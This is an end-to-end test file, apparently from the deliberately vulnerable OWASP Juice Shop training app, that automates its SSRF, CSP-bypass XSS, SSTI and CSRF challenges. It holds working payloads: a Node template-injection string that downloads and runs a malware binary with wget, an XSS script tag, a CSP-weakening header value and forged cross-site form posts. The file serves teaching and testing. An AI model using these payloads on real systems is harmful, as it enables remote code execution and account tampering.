/*
 * Copyright (c) 2014-2020 Bjoern Kimminich.
 * SPDX-License-Identifier: MIT
 */

const config = require('config')
const utils = require('../../lib/utils')

describe('/profile', () => {
  let username, submitButton, url, setProfileImageButton

  protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })

  describe('challenge "ssrf"', () => {
    it('should be possible to request internal resources using image upload URL', () => {
      browser.waitForAngularEnabled(false)
      browser.get(protractor.basePath + '/profile')
      url = element(by.id('url'))
      submitButton = element(by.id('submitUrl'))
      url.sendKeys(browser.baseUrl + '/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3')
      submitButton.click()
      browser.get(protractor.basePath + '/')
      browser.driver.sleep(5000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'SSRF' })
  })

  if (!utils.disableOnContainerEnv()) {
    describe('challenge "usernameXss"', () => {
      it('Username field should be susceptible to XSS attacks after disarming CSP via profile image URL', () => {
        browser.waitForAngularEnabled(false)
        browser.get(protractor.basePath + '/profile')

        const EC = protractor.ExpectedConditions
        url = element(by.id('url'))
        setProfileImageButton = element(by.id('submitUrl'))
        url.sendKeys("https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com")
        setProfileImageButton.click()
        browser.driver.sleep(5000)
        username = element(by.id('username'))
        submitButton = element(by.id('submit'))
        username.sendKeys('<<a|ascript>alert(`xss`)</script>')
        submitButton.click()
        browser.wait(EC.alertIsPresent(), 10000, "'xss' alert is not present on /profile")
        browser.switchTo().alert().then(alert => {
          expect(alert.getText()).toEqual('xss')
          alert.accept()
        })
        username.clear()
        username.sendKeys('αδмιη') // disarm XSS
        submitButton.click()
        url.sendKeys(browser.baseUrl + '/assets/public/images/uploads/default.svg')
        setProfileImageButton.click()
        browser.driver.sleep(5000)
        browser.get(protractor.basePath + '/#/')
        browser.waitForAngularEnabled(true)
      })
      protractor.expect.challengeSolved({ challenge: 'CSP Bypass' })
    })

    describe('challenge "ssti"', () => {
      it('should be possible to inject arbitrary nodeJs commands in username', () => {
        browser.waitForAngularEnabled(false)
        browser.get(protractor.basePath + '/profile')
        username = element(by.id('username'))
        submitButton = element(by.id('submit'))
        username.sendKeys('#{global.process.mainModule.require(\'child_process\').exec(\'wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware\')}')
        submitButton.click()

        browser.get(protractor.basePath + '/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3')

        browser.get(protractor.basePath + '/')
        browser.driver.sleep(10000)
        browser.waitForAngularEnabled(true)
      })
      protractor.expect.challengeSolved({ challenge: 'SSTi' })
    })
  }

  describe('challenge "csrf"', () => { // FIXME Only works on Chrome <80 but Protractor uses latest Chrome version. Test can probably never be turned on again.
    xit('should be possible to perform a CSRF attack against the user profile page', () => {
      browser.waitForAngularEnabled(false)
      browser.driver.get('http://htmledit.squarefree.com')
      browser.driver.sleep(1000)
      /* The script executed below is equivalent to pasting this string into http://htmledit.squarefree.com: */
      /* <form action="http://localhost:3000/profile" method="POST"><input type="hidden" name="username" value="CSRF"/><input type="submit"/></form><script>document.forms[0].submit();</script> */
      browser.executeScript("document.getElementsByName('editbox')[0].contentDocument.getElementsByName('ta')[0].value = \"<form action=\\\"" + browser.baseUrl + '/profile\\" method=\\"POST\\"><input type=\\"hidden\\" name=\\"username\\" value=\\"CSRF\\"/><input type=\\"submit\\"/></form><script>document.forms[0].submit();</script>"')
      browser.driver.sleep(5000)
      browser.waitForAngularEnabled(true)
    })
    // protractor.expect.challengeSolved({ challenge: 'CSRF' })

    xit('should be possible to fake a CSRF attack against the user profile page', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript(baseUrl => {
        var xhttp = new XMLHttpRequest()
        xhttp.onreadystatechange = function () {
          if (this.status === 200) {
            console.log('Success')
          }
        }

        var formData = new FormData()
        formData.append('username', 'CSRF')

        xhttp.open('POST', baseUrl + '/profile')
        xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded')
        xhttp.setRequestHeader('Origin', 'http://htmledit.squarefree.com') // FIXME Not allowed by browser due to "unsafe header not permitted"
        xhttp.setRequestHeader('Cookie', `token=${localStorage.getItem('token')}`) // FIXME Not allowed by browser due to "unsafe header not permitted"
        xhttp.send(formData) //eslint-disable-line
      }, browser.baseUrl)
      browser.driver.sleep(1000)
      browser.waitForAngularEnabled(true)
    })
    // protractor.expect.challengeSolved({ challenge: 'CSRF' })
  })
})
